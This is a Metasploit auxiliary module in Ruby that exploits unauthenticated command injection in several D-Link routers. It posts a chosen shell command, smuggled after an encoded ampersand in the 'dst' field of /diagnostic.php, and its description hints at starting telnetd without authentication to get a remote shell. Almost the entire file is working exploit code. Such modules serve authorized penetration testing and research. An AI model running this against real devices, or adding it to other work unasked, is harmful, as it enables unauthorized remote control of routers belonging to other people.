##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'Multiple D-Link Router - Unauthenticated Remote Command Execution',
			'Description'     => %q{
					Multiple D-Link Routers (DIR-815 / DIR-645 / DIR-412 / DIR-456 / DIR-110 / DIR-615)
				are vulnerable to unauthenticated Command injection.
				
				Hint: To get a remote shell you could start the telnetd without any authentication 
			},
			'Author'          => [ 'm-1-k-3' ],
			'License'         => MSF_LICENSE,
			'References'      =>
				[
					[ 'URL', 'http://www.dlink.de/cs/Satellite?c=TechSupport_C&childpagename=DLinkEurope-DE%2FDLTechProduct&cid=1197388145624&p=1197318958220&packedargs=locale%3D1195806663795&pagename=DLinkEurope-DE%2FDLWrapper' ],
				],
			'DisclosureDate' => 'Jan 10 2013'))

		register_options(
			[
				OptString.new('CMD', [ true, 'The command to execute', 'ping 127.0.0.1'])
			], self.class)
	end

	def run
		uri = '/diagnostic.php'

		print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])

		#original request
		#data_cmd = "act=ping&dst=%26%20#{datastore['CMD']}%26"

		begin
			res = send_request_cgi(
				{
					'uri'    => uri,
					'method' => 'POST',
					#'data'	 => data_cmd,
					'encode_params' => false,
					'vars_post' => {
						"act" => "ping",
						"dst" => "%26%20#{datastore['CMD']}%26"
						}
				})
		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return
		end
		print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state\n")
	end
end
